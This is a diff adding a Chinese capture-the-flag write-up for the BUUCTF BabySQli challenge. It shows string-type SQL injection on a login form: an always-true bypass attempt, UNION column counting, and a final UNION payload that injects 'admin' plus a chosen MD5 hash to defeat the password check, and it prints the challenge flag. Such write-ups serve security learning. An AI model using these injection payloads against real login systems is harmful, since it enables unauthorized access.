@@ -1554,6 +1554,115 @@ echo $baimao;
 
 原文链接：https://blog.csdn.net/m0_73734159/article/details/134688843?spm=1001.2014.3001.5501
 
+## BUUCTF [GXYCTF2019]BabySQli 1 详解！（MD5与SQL之间的碰撞）
+
+题目环境<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701317534738-31bd3342-4ea2-4a56-823c-011e92dda908.png#averageHue=%23fdfdfd&clientId=u4fafa7c3-a748-4&from=paste&height=482&id=u047a8f74&originHeight=602&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=34828&status=done&style=none&taskId=u7045e1f4-8a7a-4230-bdc7-b45e8abc12e&title=&width=1536)<br />burp抓包
+> 随便输入值
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701317701381-5327e24c-d5e8-425f-a981-991ac10767b9.png#averageHue=%2389a25e&clientId=u4fafa7c3-a748-4&from=paste&height=715&id=udf931653&originHeight=894&originWidth=1636&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=228241&status=done&style=none&taskId=udc78041e-a3bc-4408-8a49-453da0e7fba&title=&width=1308.8)<br />repeater放包<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701317834335-4aee35d6-5eb0-4c40-87fa-5e4f0ce45aca.png#averageHue=%23323231&clientId=u4fafa7c3-a748-4&from=paste&height=622&id=u7bcf6b25&originHeight=777&originWidth=1323&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=194683&status=done&style=none&taskId=ue9466fb4-d02e-4e14-9422-2eff2dd8bcf&title=&width=1058.4)
+> 在注释那里发现某种编码
+
+`MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5`
+> 看着像是base编码格式
+> 通过测试发现是套加密（二次加密）
+> 首先使用base32对此编码进行解码
+
+base32解码<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701318231887-b6b971ab-d961-42fe-93a9-3bd7c37a8d6e.png#averageHue=%23232631&clientId=u4fafa7c3-a748-4&from=paste&height=356&id=u9b6996b1&originHeight=445&originWidth=851&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=151430&status=done&style=none&taskId=u7b214482-8395-411b-b2ef-fd1a765e408&title=&width=680.8)<br />`c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==`
+> 两个等号base64编码无疑了
+
+base64解码<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701318415776-3a3e9367-6ebf-4c24-9ba6-2c8b97459a45.png#averageHue=%23232733&clientId=u4fafa7c3-a748-4&from=paste&height=390&id=ue5b74a7e&originHeight=487&originWidth=861&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=193466&status=done&style=none&taskId=u53bc1f2c-e998-4fb9-bbb6-ac87c548108&title=&width=688.8)
+> 得到一段SQL查询语句
+
+`select * from user where username = '$name'`
+> 通过对这段SQL语句的初步判断
+> 可以得出此题的注入点是参数name
+
+判断注入类型
+> 1
+> 123
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701318853363-a08f496f-fb3b-4d4e-8930-942c53abea62.png#averageHue=%238f9653&clientId=u4fafa7c3-a748-4&from=paste&height=708&id=ue34cdda2&originHeight=885&originWidth=1632&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=230267&status=done&style=none&taskId=ua52ecbae-fe42-45c8-a3a0-a25b1ebcd6c&title=&width=1305.6)
+> 1'
+> 123
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701318934683-7e77dca8-a44d-4437-a65b-c7be659b90a7.png#averageHue=%238f9653&clientId=u4fafa7c3-a748-4&from=paste&height=710&id=uce5a780d&originHeight=887&originWidth=1627&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=233015&status=done&style=none&taskId=u103a7b2e-8bee-48c2-9eb4-fef4f2ea0e7&title=&width=1301.6)
+> 发生报错
+> 可以得出此题的注入类型为字符型注入
+
+尝试万能密码
+> 1' or '1'='1
+> 123
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701319136270-a63563ef-4d0a-4369-a621-78e6cc3aaa30.png#averageHue=%23909653&clientId=u4fafa7c3-a748-4&from=paste&height=714&id=ubfffd86f&originHeight=893&originWidth=1638&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=231959&status=done&style=none&taskId=uce7b05af-4773-4b10-96ee-d0366a05b28&title=&width=1310.4)
+> 猜测'or'关键字或'='字符被过滤
+
+弱口令猜测
+> 首先猜测用户名既有可能是admin
+> 密码暂且还不知道
+
+判断字段数
+> 1' union select 1,2#
+> 123
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701320442138-eed521d1-e355-4fc9-9e1d-541ca010c7ab.png#averageHue=%238f9653&clientId=u4fafa7c3-a748-4&from=paste&height=710&id=ue5fdef79&originHeight=888&originWidth=1633&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=232563&status=done&style=none&taskId=uff99e7f4-fd93-4df0-90d3-7be79b973cf&title=&width=1306.4)
+> 1' union select 1,2,3#
+> 123
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701320555142-03834168-c9e5-4b17-99e7-12b3cd492206.png#averageHue=%238f9653&clientId=u4fafa7c3-a748-4&from=paste&height=708&id=u52c73137&originHeight=885&originWidth=1637&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=234477&status=done&style=none&taskId=ufe24dad3-7af6-40ae-b5e2-b0f3898e8b0&title=&width=1309.6)
+> 可知字段数是3
+
+判断用户所在列
+> 1' union select 'admin',2,3#
+> 123
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701320816927-ba876513-b4f3-49e3-9028-2a58b881281d.png#averageHue=%238f9653&clientId=u4fafa7c3-a748-4&from=paste&height=707&id=u8dc50c9b&originHeight=884&originWidth=1632&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=235733&status=done&style=none&taskId=u6cf9e39f-681d-4b2c-a314-e2b7e5861d4&title=&width=1305.6)
+> 1' union select 1,'admin',3#
+> 123
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701320921021-5cfe5bc6-dea6-406a-97e4-603fba32b8bb.png#averageHue=%238f9653&clientId=u4fafa7c3-a748-4&from=paste&height=715&id=u4a6260a3&originHeight=894&originWidth=1637&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=230931&status=done&style=none&taskId=u4d78e3b1-64e7-4d49-b80d-2fb7fdcd23b&title=&width=1309.6)
+> 通过用户所在列测试，得出了存在用户admin，又得出了admin用户在第二列，也就是username字段那一列。
+
+查看题目源码<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701321404591-11b30191-f86c-48a1-91d3-2de323db8abb.png#averageHue=%23fdfdfd&clientId=u4fafa7c3-a748-4&from=paste&height=547&id=uf3b0fe83&originHeight=684&originWidth=623&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60786&status=done&style=none&taskId=u63e65cee-40d8-468c-a392-31449fc6a8c&title=&width=498.4)
+> 在search.php源代码哪里发现关键代码
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701321715192-8fd61512-c67b-4477-ad58-63d0e4018668.png#averageHue=%23fefdfd&clientId=u4fafa7c3-a748-4&from=paste&height=722&id=uf89a66e1&originHeight=902&originWidth=1906&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106459&status=done&style=none&taskId=u46fed8e0-f89e-4819-b3a4-73477d83825&title=&width=1524.8)
+```php
+if($arr[1] == "admin"){
+			if(md5($password) == $arr[2]){
+				echo $flag;
+			}
+			else{
+				die("wrong pass!");
+			}
+		}
+```
+> 发现参数password被md5加密
+> 看着和之前做过的题很类似
+> 大致就是传进去的值要进行md5值加密
+
+> **换种方式猜测**
+> **username数据表里面的3个字段分别是flag、name、password。**
+> **猜测只有password字段位NULL**
+> **咱们给参数password传入的值是123**
+> **那么传进去后，后台就会把123进行md5值加密并存放到password字段当中**
+> **当我们使用查询语句的时候**
+> **我们pw参数的值会被md5值进行加密**
+> **然后再去与之前存入password中的md5值进行比较**
+> **如果相同就会输出flag**
+
+**爆flag：**
+> 这里pw参数的值为123456
+> 可以随便传
+> 但是要对传入的那个值进行md5值加密
+> 网上可以随便找一个在线md5加密平台
+
+> 1'union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#
+> 123456
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701323037228-e84042b5-d094-454c-af0b-6847d6d2a438.png#averageHue=%23809351&clientId=u4fafa7c3-a748-4&from=paste&height=722&id=uaa4b61fe&originHeight=902&originWidth=1635&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=225206&status=done&style=none&taskId=u7bc46944-825d-46ab-8405-ce4ba7c735e&title=&width=1308)<br />**得出flag：**<br />`flag{3c7be44e-df35-40a7-bd91-1b210bf75fcb}`
+
+原文链接：https://blog.csdn.net/m0_73734159/article/details/134710609?spm=1001.2014.3001.5501
+
 
 
 
